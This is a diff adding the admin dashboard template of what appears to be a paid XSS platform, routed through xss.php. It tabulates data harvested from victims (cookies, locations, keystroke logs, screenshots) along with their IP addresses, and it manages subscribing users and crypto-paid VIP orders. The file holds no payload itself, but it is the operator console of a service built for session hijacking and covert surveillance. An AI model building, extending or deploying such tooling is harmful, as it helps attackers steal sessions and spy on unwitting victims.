@@ -1,0 +1,256 @@
+{include file="header.html"}
+<style>
+.admin-dashboard { padding: 20px 0; }
+.stat-cards { display: grid; grid-template-columns: repeat(auto-fit, minmax(200px, 1fr)); gap: 20px; margin-bottom: 30px; }
+.stat-card { background: var(--bg-card); border: 1px solid var(--border-color); border-radius: 12px; padding: 25px; text-align: center; }
+.stat-card h3 { color: var(--neon-blue); font-size: 36px; margin-bottom: 10px; }
+.stat-card p { color: var(--text-secondary); text-transform: uppercase; letter-spacing: 1px; font-size: 12px; }
+.stat-card.green h3 { color: var(--neon-green); }
+.stat-card.purple h3 { color: var(--neon-purple); }
+.stat-card.orange h3 { color: #ff9500; }
+.data-table { width: 100%; border-collapse: collapse; margin-top: 20px; }
+.data-table th, .data-table td { padding: 12px 15px; text-align: left; border-bottom: 1px solid var(--border-color); }
+.data-table th { background: rgba(0,212,255,0.1); color: var(--neon-blue); text-transform: uppercase; font-size: 11px; letter-spacing: 1px; }
+.data-table tr:hover { background: rgba(0,212,255,0.05); }
+.data-table .cookie-data { max-width: 400px; overflow: hidden; text-overflow: ellipsis; white-space: nowrap; font-family: monospace; font-size: 11px; color: var(--neon-green); }
+.data-table .ip-addr { font-family: monospace; }
+.panel-section { background: var(--bg-card); border: 1px solid var(--border-color); border-radius: 12px; padding: 20px; margin-bottom: 20px; }
+.panel-section h4 { color: var(--neon-blue); margin-bottom: 20px; text-transform: uppercase; letter-spacing: 1px; }
+.filter-bar { display: flex; gap: 15px; margin-bottom: 20px; flex-wrap: wrap; }
+.filter-bar input, .filter-bar select { padding: 10px 15px; background: rgba(0,0,0,0.2); border: 1px solid var(--border-color); border-radius: 4px; color: var(--text-primary); }
+.filter-bar button { padding: 10px 20px; background: var(--neon-blue); border: none; border-radius: 4px; color: #fff; cursor: pointer; }
+.filter-bar button:hover { background: var(--neon-purple); }
+.action-btn { padding: 5px 10px; border-radius: 4px; font-size: 11px; margin-right: 5px; }
+.action-btn.view { background: var(--neon-blue); color: #fff; }
+.action-btn.delete { background: #ff4757; color: #fff; }
+</style>
+
+<div class="container">
+{include file="menus.html"}
+<div class="col-sm-9">
+    <div class="admin-dashboard">
+        <h2 style="color: var(--neon-blue); margin-bottom: 30px; text-transform: uppercase; letter-spacing: 2px;">
+            <span style="margin-right: 10px;">&#9889;</span>管理員後台
+        </h2>
+
+        <!-- 統計卡片 -->
+        <div class="stat-cards">
+            <div class="stat-card">
+                <h3>{$total_projects}</h3>
+                <p>總項目數</p>
+            </div>
+            <div class="stat-card green">
+                <h3>{$total_cookies}</h3>
+                <p>Cookie 總數</p>
+            </div>
+            <div class="stat-card purple">
+                <h3>{$total_users}</h3>
+                <p>用戶總數</p>
+            </div>
+            <div class="stat-card orange">
+                <h3>{$total_vip}</h3>
+                <p>VIP 會員</p>
+            </div>
+        </div>
+
+        <!-- 最新收到的數據 -->
+        <div class="panel-section">
+            <h4>&#128268; 最新收到的數據</h4>
+            <div class="filter-bar">
+                <input type="text" id="searchKey" placeholder="搜索關鍵詞...">
+                <select id="filterType">
+                    <option value="all">全部類型</option>
+                    <option value="cookie">Cookie</option>
+                    <option value="location">位置信息</option>
+                    <option value="keystroke">鍵盤記錄</option>
+                    <option value="screenshot">截圖</option>
+                </select>
+                <button onclick="filterData()">搜索</button>
+            </div>
+            <table class="data-table" id="dataTable">
+                <thead>
+                    <tr>
+                        <th>時間</th>
+                        <th>項目</th>
+                        <th>類型</th>
+                        <th>IP</th>
+                        <th>數據</th>
+                        <th>操作</th>
+                    </tr>
+                </thead>
+                <tbody>
+                    {foreach from=$recent_data item=row}
+                    <tr>
+                        <td>{$row.add_time|date_format:'%Y-%m-%d %H:%M:%S'}</td>
+                        <td><a href="{$url.root}/xss.php?do=project&act=view&id={$row.project_id}" target="_blank" style="color: var(--neon-blue);">{$row.project_name}</a></td>
+                        <td>
+                            {if $row.data_type == 'cookie'}
+                                <span style="color: var(--neon-green);">&#127836; Cookie</span>
+                            {elseif $row.data_type == 'location'}
+                                <span style="color: var(--neon-blue);">&#128205; 位置</span>
+                            {elseif $row.data_type == 'keystroke'}
+                                <span style="color: #ff9500;">&#128241; 鍵盤</span>
+                            {elseif $row.data_type == 'screenshot'}
+                                <span style="color: var(--neon-purple);">&#128247; 截圖</span>
+                            {else}
+                                <span>{$row.data_type}</span>
+                            {/if}
+                        </td>
+                        <td class="ip-addr">{$row.ip}</td>
+                        <td class="cookie-data" title="{$row.data_content}">
+                            {if strlen($row.data_content) > 60}
+                                {substr($row.data_content, 0, 60)}...
+                            {else}
+                                {$row.data_content}
+                            {/if}
+                        </td>
+                        <td>
+                            <button class="action-btn view" onclick="viewData({$row.id})">查看</button>
+                            <button class="action-btn delete" onclick="deleteData({$row.id})">刪除</button>
+                        </td>
+                    </tr>
+                    {foreachelse}
+                    <tr>
+                        <td colspan="6" style="text-align: center; padding: 40px; color: var(--text-secondary);">
+                            &#128269; 暫無數據
+                        </td>
+                    </tr>
+                    {/foreach}
+                </tbody>
+            </table>
+        </div>
+
+        <!-- 用戶管理 -->
+        <div class="panel-section">
+            <h4>&#128101; 用戶列表</h4>
+            <table class="data-table">
+                <thead>
+                    <tr>
+                        <th>ID</th>
+                        <th>用戶名</th>
+                        <th>VIP 狀態</th>
+                        <th>項目數</th>
+                        <th>Cookie 數</th>
+                        <th>註冊時間</th>
+                        <th>操作</th>
+                    </tr>
+                </thead>
+                <tbody>
+                    {foreach from=$users item=u}
+                    <tr>
+                        <td>{$u.id}</td>
+                        <td>{$u.userName}</td>
+                        <td>
+                            {if $u.vip_level}
+                                <span style="color: var(--neon-green);">{$u.vip_level|upper}</span>
+                                {if $u.vip_expire > time()}
+                                    (至 {$u.vip_expire|date_format:'%Y-%m-%d'})
+                                {else}
+                                    <span style="color: #ff4757;">(已過期)</span>
+                                {/if}
+                            {else}
+                                <span style="color: var(--text-secondary);">普通用戶</span>
+                            {/if}
+                        </td>
+                        <td>{$u.project_count}</td>
+                        <td>{$u.cookie_count}</td>
+                        <td>{$u.addTime|date_format:'%Y-%m-%d'}</td>
+                        <td>
+                            <button class="action-btn view" onclick="viewUser({$u.id})">詳情</button>
+                            {if $u.vip_level}
+                                <button class="action-btn delete" onclick="cancelVip({$u.id})">取消VIP</button>
+                            {/if}
+                        </td>
+                    </tr>
+                    {foreachelse}
+                    <tr>
+                        <td colspan="7" style="text-align: center; padding: 40px; color: var(--text-secondary);">
+                            暫無用戶
+                        </td>
+                    </tr>
+                    {/foreach}
+                </tbody>
+            </table>
+        </div>
+
+        <!-- 訂單管理 -->
+        <div class="panel-section">
+            <h4>&#128176; 訂單管理</h4>
+            <table class="data-table">
+                <thead>
+                    <tr>
+                        <th>訂單號</th>
+                        <th>用戶</th>
+                        <th>套餐</th>
+                        <th>金額</th>
+                        <th>TxHash</th>
+                        <th>狀態</th>
+                        <th>時間</th>
+                    </tr>
+                </thead>
+                <tbody>
+                    {foreach from=$orders item=o}
+                    <tr>
+                        <td><code>{$o.orderId}</code></td>
+                        <td><a href="?view_user={$o.userId}" style="color: var(--neon-blue);">UID:{$o.userId}</a></td>
+                        <td>{$o.plan}</td>
+                        <td style="color: var(--neon-green);">$ {$o.amount}</td>
+                        <td><code style="font-size: 11px;">{$o.txHash|truncate:20}</code></td>
+                        <td>
+                            {if $o.status == 'confirmed'}
+                                <span style="color: var(--neon-green);">&#10004; 已確認</span>
+                            {elseif $o.status == 'pending'}
+                                <span style="color: #ff9500;">&#8987; 待確認</span>
+                            {else}
+                                <span style="color: #ff4757;">&#10006; 失敗</span>
+                            {/if}
+                        </td>
+                        <td>{$o.addTime|date_format:'%Y-%m-%d %H:%M'}</td>
+                    </tr>
+                    {foreachelse}
+                    <tr>
+                        <td colspan="7" style="text-align: center; padding: 40px; color: var(--text-secondary);">
+                            暫無訂單
+                        </td>
+                    </tr>
+                    {/foreach}
+                </tbody>
+            </table>
+        </div>
+    </div>
+</div>
+</div>
+
+<script>
+function viewData(id) {
+    window.open('{$url.root}/xss.php?do=admin&act=view_data&id=' + id, '_blank');
+}
+
+function deleteData(id) {
+    if(confirm('確定刪除這條數據？')) {
+        fetch('{$url.root}/xss.php?do=admin&act=delete_data&id=' + id)
+            .then(r => r.json())
+            .then(d => { if(d.success) location.reload(); });
+    }
+}
+
+function viewUser(id) {
+    window.open('{$url.root}/xss.php?do=profile&act=view&id=' + id, '_blank');
+}
+
+function cancelVip(id) {
+    if(confirm('確定取消該用戶的VIP？')) {
+        fetch('{$url.root}/xss.php?do=admin&act=cancel_vip&id=' + id)
+            .then(r => r.json())
+            .then(d => { if(d.success) location.reload(); });
+    }
+}
+
+function filterData() {
+    var key = document.getElementById('searchKey').value;
+    var type = document.getElementById('filterType').value;
+    location.href = '{$url.root}/xss.php?do=admin&key=' + key + '&type=' + type;
+}
+</script>
+
+{include file="footer.html"}
